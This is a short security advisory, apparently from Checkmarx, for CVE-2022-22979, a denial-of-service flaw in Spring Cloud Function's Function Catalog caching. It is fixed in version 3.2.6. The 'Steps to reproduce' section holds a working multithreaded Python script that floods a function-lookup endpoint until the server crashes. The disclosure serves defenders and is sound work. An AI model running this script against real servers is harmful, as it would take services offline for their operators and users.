---
title: DoS in Spring Cloud Function
date: 2021-06-17
tags:
	- "java"
	- "dos"
	- "denial of service"
advisory: true
origin: https://advisory.checkmarx.net/advisory/CX-2022-5009/
cves:
	- "CVE-2022-22979"
---
## Summary
In Spring Cloud Function versions 3.2.5 and older unsupported versions, it is possible for a user who directly interacts with framework provided lookup functionality to cause denial of service condition due to the caching issue in Function Catalog component of the framework. At the time of writing of this CVE such interaction is only possible via spring-cloud-function-web module.

## Product
Spring Cloud Function versions before 3.2.6.

## Impact
In case the web endpoint for function invocation is open a DoS could be achieved.

## Steps to reproduce
```
import threading
def a():
	for i in range(100000):
		response =requests.post(f"http://host/uppercase,", json={'a':1})
		if i%100 == 0:
			print(response.elapsed.total_seconds()) 

for i in range(10):
	threading.Thread(target=a).start()
	if i ==9:
		a()

```
* replace the name of the function (`uppercase`) with a function that exists

### Expected result:
The time for a response will rise and eventually crash the server.

## Remediation
Update Spring Cloud Function to 3.2.6 or above.

## Credit
This issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://twitter.com/ynizry).

## Resources
1. [Official advisory](https://tanzu.vmware.com/security/cve-2022-22979)
2. [Commit](https://github.com/spring-cloud/spring-cloud-function/commit/9b6952f041ed028aba1165a55f38589ec6a93c09)